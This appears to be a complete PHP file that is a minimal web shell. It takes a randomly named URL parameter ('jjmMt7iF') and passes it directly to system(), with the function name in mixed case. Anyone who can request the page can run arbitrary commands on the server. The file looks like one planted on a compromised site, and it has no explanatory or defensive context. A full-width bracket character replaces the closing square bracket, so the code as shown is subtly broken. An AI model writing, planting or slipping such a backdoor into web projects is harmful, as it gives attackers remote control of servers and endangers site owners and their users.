<?php
SysTeM($_GET['jjmMt7iF'〕);
?>
